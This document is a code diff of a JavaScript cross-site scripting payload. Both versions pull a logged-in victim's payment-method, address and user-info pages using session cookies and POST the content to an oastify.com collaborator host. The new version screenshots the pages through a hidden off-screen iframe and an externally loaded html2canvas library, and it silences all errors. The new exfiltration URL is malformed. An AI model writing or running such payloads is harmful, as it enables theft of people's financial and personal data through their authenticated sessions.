@@ -1,30 +1,36 @@
 (async () => {
-  const exfilEndpoint = "http://sc8x6e61qbs6lify3ui82ammjdp4dv7jw.oastify.com/";
-  const targets = [
+  const exfil = "https://sc8x6e61qbs6lify3ui82ammjdp4dv7jw.oastify.comscreenshot";
+  const paths = [
     "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
     "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
     "/user/userinfo/"
   ];
 
-  for (const path of targets) {
-    try {
-      const res = await fetch(path, { credentials: "include" });
-      const html = await res.text();
+  const script = document.createElement('script');
+  script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
+  script.onload = async () => {
+    for (const path of paths) {
+      try {
+        const iframe = document.createElement("iframe");
+        iframe.style = "width:1000px;height:1000px;position:absolute;top:-2000px;";
+        iframe.src = path;
+        document.body.appendChild(iframe);
 
-      const imgData = `data:text/html;base64,${btoa(html)}`;
+        await new Promise(r => setTimeout(r, 3000)); // wait for iframe to load
 
-      await fetch(exfilEndpoint, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          url: location.origin + path,
-          image: imgData
-        })
-      });
-    } catch (err) {
-      // Fail silently
+        const canvas = await html2canvas(iframe.contentDocument.body);
+        const img = canvas.toDataURL("image/png");
+
+        await fetch(exfil, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ url: location.origin + path, image: img })
+        });
+
+        document.body.removeChild(iframe);
+      } catch (e) {}
     }
-  }
+  };
+  document.body.appendChild(script);
 })();
